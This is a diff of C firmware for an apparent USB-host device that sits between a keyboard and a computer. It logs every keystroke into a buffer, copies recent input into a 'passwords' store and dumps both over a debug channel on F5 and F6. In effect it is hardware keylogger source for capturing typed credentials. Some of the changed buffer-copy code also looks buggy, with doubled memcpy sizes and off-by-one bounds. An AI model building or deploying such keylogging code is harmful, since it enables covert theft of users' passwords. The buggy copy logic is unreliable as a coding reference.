@@ -17,13 +17,13 @@
 /*
  * defines
  */
-#define NB_INPUT 200
-#define PASSWORD_MAX_SIZE 30  // must be < NB_INPUT
+#define NB_INPUT 20
+#define PASSWORD_MAX_SIZE 5 // must be < NB_INPUT
 
 /*
  * variables
  */
-static uint8_t inputs[NB_INPUT];
+static uint16_t inputs[NB_INPUT];
 static int     input_timer = -1;
 int            input_index = 0;
 
@@ -59,20 +59,20 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
 
         //get every input in a tab
         uint16_t input = get_input_hid(report);
-        rtt_printf("Key code: %04x, input_index = %d", input, input_index);
+        rtt_printf("Key: %c (%04x), input_index = %d", hid2azerty(input), input, input_index);
         if((uint8_t)input) {
             inputs[input_index] = input;
             usbh_detector(hid2azerty(input));
-            if(input_index++ >= 200)
+            if(input_index++ >= NB_INPUT)
                 input_index = 0;
         }
 
         if(report[2] == KEY_F6)
-            for(int i = 0; i < input_index; i++)
+            for(int i = 0; i < input_index-1; i++)
                 rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);
 
         if(report[2] == KEY_F5)
-            for(int i = 0; i < password_index; i++)
+            for(int i = 0; i < password_index-1; i++)
                 rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);
 
         if(report[2] == KEY_F1 &&
@@ -125,19 +125,6 @@ static void ThreadTestHID(void *p)
  */
 void usbh_init(void)
 {
-    //  passwords[0] = 'P';
-    //  passwords[1] = 'a';
-    //  passwords[2] = 's';
-    //  passwords[3] = 's';
-    //  passwords[4] = 'W';
-    //  passwords[5] = 'o';
-    //  passwords[6] = 'r';
-    //  passwords[7] = 'd';
-    //  passwords[8] = ' ';
-    //  passwords[9] = '!';
-
-    //  password_index = 10;
-
     /*USBH_FS OTG*/
     palSetPadMode(GPIOA, GPIOA_OTG_FS_VBUS, PAL_MODE_OUTPUT_PUSHPULL);
     palSetPadMode(GPIOA, GPIOA_OTG_FS_DM, PAL_MODE_ALTERNATE(10));
@@ -157,12 +144,16 @@ void usbh_init(void)
  */
 static void store_lasts_inputs(int size)
 {
-    if(input_index < size) {  // buffer made a loop
-        int bytes_written = size - input_index;
-        memcpy(passwords + password_index, inputs + NB_INPUT - bytes_written, bytes_written);
-        memcpy(passwords + password_index + bytes_written, inputs, size - bytes_written);
-    } else
-        memcpy(passwords + password_index, inputs + input_index - size, size);
+    rtt_printf("input_index = %d, size = %d", input_index, size);
+    if(input_index < size-1) {  // buffer made a loop
+        int bytes_written = size - input_index - 1;
+        //end inputs
+        memcpy(passwords + password_index, inputs + NB_INPUT - bytes_written, (bytes_written)*2);
+        //start inputs
+        memcpy(passwords + password_index + bytes_written, inputs, (input_index-1)*2);
+    } else {
+        memcpy(passwords + password_index, inputs + input_index - size+1, size*2);
+    }
     password_index += size;
 }
 
